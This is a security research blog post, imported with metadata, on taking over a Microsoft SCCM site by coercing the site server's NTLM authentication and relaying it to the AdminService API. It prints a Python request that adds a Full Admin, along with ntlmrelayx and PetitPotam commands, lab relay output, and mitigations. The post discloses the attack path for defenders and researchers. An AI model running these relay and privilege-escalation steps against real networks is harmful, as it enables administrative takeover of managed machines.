---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-10_site-takeover-via-sccms-adminservice-api.md
original_filename: 2023-08-10_site-takeover-via-sccms-adminservice-api.md
title: Site Takeover via SCCM’s AdminService API
category: documents
detected_topics:
- access-control
- api-security
- sso
- command-injection
- mfa
- automation-abuse
tags:
- imported
- documents
- access-control
- api-security
- sso
- command-injection
- mfa
- automation-abuse
language: en
raw_sha256: 92fad0aa1020ff318d8817ff5936c7d564ea6edbb73a0b544dcd2b0ad87854f7
text_sha256: 83ff7381e264f995671a5e5080d276abfba5f40f5bbc02595df9afcf61997e18
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# Site Takeover via SCCM’s AdminService API

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-10_site-takeover-via-sccms-adminservice-api.md
- Source Type: markdown
- Detected Topics: access-control, api-security, sso, command-injection, mfa, automation-abuse
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `92fad0aa1020ff318d8817ff5936c7d564ea6edbb73a0b544dcd2b0ad87854f7`
- Text SHA256: `83ff7381e264f995671a5e5080d276abfba5f40f5bbc02595df9afcf61997e18`


## Content

---
title: "Site Takeover via SCCM’s AdminService API"
page_title: "Site Takeover via SCCM’s AdminService API - SpecterOps"
url: "https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf"
final_url: "https://specterops.io/blog/2023/08/10/site-takeover-via-sccms-adminservice-api/"
authors: ["Garrett Foster (@garrfoster)"]
bugs: ["NTLM", "SCCM site takeover"]
publication_date: "2023-08-10"
added_date: "2023-08-21"
source: "pentester.land/writeups.json"
original_index: 863
---

[ Back to Blog  ](/blog)

[Research & Tradecraft](https://specterops.io/blog/category/research/)

# Site Takeover via SCCM’s AdminService API

Author

[Garrett Foster](https://specterops.io/blog/author/garrett-foster/)

Read Time

9 mins

Published

Aug 10, 2023

##### Share

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fspecterops.io%2Fblog%2F2023%2F08%2F10%2Fsite-takeover-via-sccms-adminservice-api%2F&title=Site+Takeover+via+SCCM%E2%80%99s+AdminService+API&source=SpecterOps) [ ](https://twitter.com/share?url=https%3A%2F%2Fspecterops.io%2Fblog%2F2023%2F08%2F10%2Fsite-takeover-via-sccms-adminservice-api%2F&text=Site+Takeover+via+SCCM%E2%80%99s+AdminService+API) [ ](mailto:?Subject=I%20thought%20you'd%20like%20this%20post:%20Site Takeover via SCCM’s AdminService API&Body=https://specterops.io/blog/2023/08/10/site-takeover-via-sccms-adminservice-api/) [ ](https://specterops.io/blog/category/research/feed/)

**tl:dr:** The SCCM AdminService API is vulnerable to NTLM relaying and can be abused for SCCM site takeover.

#### Prior Work and Credit

Before I get started, I’d like to acknowledge some of the work previously done that inspired researching SCCM.

[Chris Thompson](https://twitter.com/_mayyhem) previously [covered](https://medium.com/@Mayyhem) multiple issues involving SCCM, including a site takeover primitive via MSSQL, and is the primary developer of the [SharpSCCM project](https://github.com/Mayyhem/SharpSCCM). [Duane Michael](https://twitter.com/subat0mik) [wrote about](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9) recovering Network Access Account (NAA) credentials from DPAPI on SCCM clients. [Adam Chester](https://twitter.com/_xpn_) similarly wrote about [spoofing client enrollment](https://blog.xpnsec.com/unobfuscating-network-access-accounts/) to recover NAA credentials. And I’d like to acknowledge [Matt Nelson](https://twitter.com/enigma0x3), [Will Schroeder](https://twitter.com/harmj0y), and several others for their work on the [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) project and many associated blog posts.

There are many, many others, and thankfully [Carsten Sandker](https://twitter.com/0xcsandker) included a reference section in [his blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) covering SCCM tradecraft I will refer you to for more reading on SCCM.

#### **Introduction**

While researching SCCM services, I was studying the various access methods to retrieve or modify data stored in a SCCM site’s database. Typically, IT administrators managing SCCM use the Configuration Manager Console GUI which connects to a site’s SMS Provider. The SMS Provider is a SCCM server role that hosts a collection of Windows Management Instrumentation (WMI) classes that translate queries to access data stored in the site’s Database Server. In addition to WMI, the SMS Provider also hosts the Administration Service (AdminService) API. Both are utilized by the Configuration Manager Console and can also be used as standalone services.

#### AdminService

The AdminService API is a REST API based on the Open Data v4 protocol that grants similar, however limited, administrative access to site data when compared to its WMI counterpart. There are currently two routes, shown below, available for the AdminService.
  
  
  https://target.siteserver.domain/AdminService/wmi/
  https://target.siteserver.domain/AdminService/v1.0/

Each route provides its own functionality according to [Microsoft](https://learn.microsoft.com/en-us/mem/configmgr/develop/adminservice/overview):

> The WMI route supports both GET and POST commands to over 700 classes. [The] versioned route (v1.0) supports new Configuration Manager functionality.

While there are quite a few classes available through the API, I state it’s limited simply because not every WMI class from the SCCM namespace is integrated and, in some cases, not all the methods of the integrated classes are operational from the API. Despite the limitations, SCCM uses the API for several functions and integrations such as [Microsoft Intune tenant attach](https://learn.microsoft.com/en-us/mem/configmgr/tenant-attach/device-sync-actions). However, the most intriguing aspect of the API for me was how authentication was handled.

When navigating to one of the two routes, the user is met with the following authentication prompt, which reveals the AdminService uses Microsoft Negotiate for authentication.

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/1cxI8ZUblJOTh6grkxBwPgg.jpeg)AdminService API Authentication Prompt

Microsoft Negotiate supports two authentication protocols: Kerberos and NTLM. During authentication, Negotiate will try to use the Kerberos protocol unless the authenticating client simply doesn’t support Kerberos or there wasn’t enough information supplied in the request to support it. If Kerberos fails, Negotiate falls back to NTLM which is [notoriously](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867) [vulnerable](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) to [abuse](https://posts.specterops.io/certified-pre-owned-d95910965cd2). Most notably: credential relaying.

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/1uvQJNgrDqqJ-0aTv19iORA.png)

With this in mind, I began crafting hypothetical scenarios for privilege escalation which focused on forcing or coercing authentication from an SCCM administrator user to the API. Ultimately, while feasible, it’s unlikely this method would be reliably successful. So, I turned to how permissions for the API were managed.

#### SMS Providers

For every SCCM deployment at least one SMS Provider role is required. When designing the hierarchy of a site, there are a few considerations to be made regarding how to host the SMS Provider and each configuration has their [pros and cons](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider#choosing-a-location). The options are:

  1. Hosted on the Site Server
  2. Hosted on the Database Server
  3. Self-hosted remotely

Another consideration to make is if there is a need for multiple SMS Providers. In some environments, such as where high availability or segmentation are required, it’s possible to configure more than one SMS Provider for multiple instances of the Configuration Manager Console to connect to. The key takeaway from this is that all SMS Providers in a site share the same site database.

#### SMS Admins

To grant access to WMI and the AdminService, SCCM creates the “SMS Admins” local security group on each SMS Provider in the hierarchy. Membership of this group is managed by SCCM from the RBAC_Admins table stored in the site database. When an administrative user is added or removed from the role in the Site Database, that change is replicated to all SMS Providers. This in turn updates the membership for the SMS Admins local security group accordingly. Furthermore, reviewing [documentation](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider#choosing-a-location) for this group reveals an additional default member.

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/1fXSJKR8gHbT78fYRPHqHew.png)

By default, the site server machine account is a member of the SMS Admins group. This might sound familiar as Chris has already demonstrated abusing similar [default configurations](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1) associated with the site server machine account.

#### SMS_Admin Class

To manage membership of this group in the Site Database, the WMI provider namespace uses the SMS_Admin class which is fully integrated by the AdminService API. Working with the API was an adventure in itself as there isn’t much documentation available, but after some trial and error (see: guessing), I managed to come up with the Python syntax to make the correct POST request for the SMS_Admin method of the API to add an arbitrary user as Full Admin.
  
  
  
  ---snipped---
  
  headers = {'Content-Type': 'application/json; odata=verbose'}
  requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
  
  body = {"LogonName": f"{targetuser}", 
  "AdminSid":f"{sid}",
  "Permissions":[{"CategoryID": "SMS00ALL", 
  "CategoryTypeID": 29, 
  "RoleID":"SMS0001R",
  },
  {"CategoryID": "SMS00001",
  "CategoryTypeID": 1, 
  "RoleID":"SMS0001R", 
  },
  {"CategoryID": "SMS00004", 
  "CategoryTypeID": 1, 
  "RoleID":"SMS0001R",
  }],
  "DisplayName":f"{targetuser}"
  }
  
  url = f"https://{target}/AdminService/wmi/SMS_Admin/"
  
  try:
  r = requests.post(f"{url}",
  auth=HttpNtlmAuth(username, password),
  verify=False,headers=headers, json=body)
  
  ---snipped---

At this point, all the necessary pieces for site takeover via credential relaying were available.

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/1Nm7z2JxPwvB6s3jw403Y6g.jpeg)

#### Site Takeover

To summarize, due to the site server’s default membership in the SMS Admins group, an authenticated attacker could coerce authentication from the server and relay that authentication to the AdminService API hosted on a remote SMS Provider to add an arbitrary user as Full Administrator of the site.

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/1umN5npVyuNTo8uJ-Ehq95A.png)

To abuse the above attack path, an attacker simply needs valid domain credentials and network connectivity to the associated server roles. However, a caveat does exist: The site server cannot be relayed to itself. If the SMS Provider isn’t remote or there are no additional SMS Provider roles set up in the hierarchy, the path does not exist.

#### Demo

To keep the demo simple, the lab environment contains a Site Server, an SMS Provider, and a Kali Linux system as the relay server. Additionally, control over a target domain account and knowledge of the account’s security identifier (SID) for privilege escalation are assumed.

<https://medium.com/media/06d442a2ae042e6593b251bdbb539f6e/href>

#### Demo Breakdown

  1. On the Kali host, configure ntlmrelayx to target the AdminService on the SMS Provider and provide the flag values for logonname, displayname, and object-sid. **Note** : the version of ntlmrelayx used in the demo is currently a [PR](https://github.com/fortra/impacket/pull/1593) as of this blog’s publication and was developed with the help of [Matt Creel](https://twitter.com/tw1sm).

  
  
  ntlmrelayx.py -t https://provider.corp.contoso.com/AdminService/wmi/SMS_Admin
  -smb2support --adminservice --logonname "CORPlowpriv" --displayname 
  "CORPlowpriv" --objectsid S-1-5-21-2541397155-1844004377-132384732-1602

2\. Next, configure [PetitPotam.py](https://github.com/topotam/PetitPotam), or a similar tool, to coerce authentication from the primary site server to the Kali relay server.
  
  
  python3 PetitPotam.py -u lowpriv -p "P@ssw0rd" 10.0.0.200 cm1.corp.contoso.com

3\. The relay server will receive an incoming connection and relay the authentication to the AdminService API and add the supplied user as an admin.
  
  
  [*] SMBD-Thread-5 (process_request_thread): **Received connection from 10.0.0.7, 
  attacking target https://provider.corp.contoso.com**
  [*] Exiting standard auth flow to add SCCM admin...
  **[*] Authenticating against https://provider.corp.contoso.com as CORP/CM1$**
  **[*] Adding administrator via SCCM AdminService..**.
  [*] SMBD-Thread-15 (process_request_thread): Received connection from 10.0.0.7,
  attacking target https://provider.corp.contoso.com
  **[*] Exiting standard auth flow to add SCCM admin...**
  [*] Authenticating against https://provider.corp.contoso.com as CORP/CM1$
  [*] Skipping user CM1$ since attack was already performed
  **[*] Server returned code 201, attack successful**

4\. Move on to postex as a SCCM admin.

#### Defensive Considerations

Chris has a great resource started on the [SharpSCCM Wiki](https://github.com/Mayyhem/SharpSCCM/wiki#defensive-recommendations) for a broad look at various vulnerabilities associated with SCCM.

For this path specifically here are a few options I feel could help mitigate or detect the issue:

  1. Monitor group membership changes for the SMS Admins local security group on SMS Providers.  
– **Event 4732** — A member was added to a security-enabled local group

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/18kJEp9pd0I2H3gEmJVVhww.jpeg)

2\. If using multiple remote Configuration Manager Consoles, consider using host-based firewall rules to prevent arbitrary access to the AdminService API.

3\. There are [additional options](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-security#sms-provider-authentication) available for managing Configuration Manager Console access. These include leveraging PKI for Certificate based authentication and Windows Hello for Business for MFA support.

#### Some additional thoughts

In a situation where the site server machine account’s NTLM hash is known, for example from AD CS abuse, interacting with the API via pass-the-hash is possible. [Here](https://github.com/garrettfoster13/smsadmin) is a basic proof of concept of that capability which will later be added into [SCCMHunter.](https://github.com/garrettfoster13/sccmhunter)

Also, my original idea of coercing from an existing SCCM admin would work. If you’re in a position where you can’t control authentication from the site server but you can reach an SMS Provider, an internal phish could do the trick.

In the next blog, I’ll talk about how to abuse the SMS Provider’s role on the site database to take over the site.

And finally, NTLM must die.

![](https://specterops.io/wp-content/uploads/sites/3/2023/08/1p81ovbu9ARkfsDRYmata_w.png)

![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=d932e22b2bf)

* * *

[Site Takeover via SCCM’s AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf) was originally published in [Posts By SpecterOps Team Members](https://posts.specterops.io) on Medium, where people are continuing the conversation by highlighting and responding to this story.

Post Views: 3,520

[ Garrett Foster ](https://specterops.io/blog/author/garrett-foster/)

Senior Security Researcher 

Garrett is a Senior Security Researcher at SpecterOps specializing in Windows tradecraft and attack path development. His research focuses on Active Directory security and enterprise management infrastructure.
